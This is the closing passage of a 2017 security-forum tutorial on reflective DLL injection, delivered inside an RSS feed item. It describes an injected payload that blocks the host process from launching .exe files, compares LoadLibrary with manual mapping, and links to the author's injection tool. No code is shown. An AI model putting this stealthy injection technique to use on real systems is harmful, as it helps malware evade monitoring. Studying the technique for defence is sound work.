<p>Firstly, <code>Phage</code> has placed itself in the memory address <code>0x1580000</code>. We can also see at the bottom of the list of stacked DLLs there is the loaded <code>Shlwapi.dll</code> library which was defined in the above code. The imported function <code>StrStrIW</code> is used in the payload to filter out certain parameters under a feature which I have impaired as seen here:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a0620628f269f6967f2742a68bf85be3f18b4afc.JPG" width="690" height="461"></p>
<p>Whenever the infected process tries to start a process which has a <code>.exe</code> in its name, it will be denied.</p>
<hr>
<h1>Conclusion</h1>
<p>Reflective DLL injection is just the emulation of the Windows image loader to map and execute a DLL into another process’s address space which can remain hidden due to the lack of obvious information provided by monitoring tools.</p>
<p><code>LoadLibrary</code> versus manual injection? They both have their advantages and disadvantages. For example, <code>LoadLibrary</code> provides a much more elegant injection that properly executes the <code>DllMain</code> entry point with the correct arguments. On the other hand, I’ve no idea how it would be possible using what I did which means that it may not be possible to utilise the <code>fdwReason</code> parameter to properly execute code under certain circumstances and hence, may fire off code multiple times undesirably. There might be a way to do it but I do not know of it.</p>
<p>As I’ve stated previously, the code is bare minimum working and there may be a lot more things I’d need to add to support DLLs with slightly different structures. I’ve also opted to create a GUI for it too but further development of the code might not be considered for the time being. I will upload it to my Gitlab <a href="https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Lynx">here</a>!</p>
<p>Thanks for reading and I hope you’ve learned something!</p>
<p>– <em>dtm</em></p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/1</link>
        <pubDate>Fri, 28 Jul 2017 17:25:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-1</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
  </channel>
</rss>
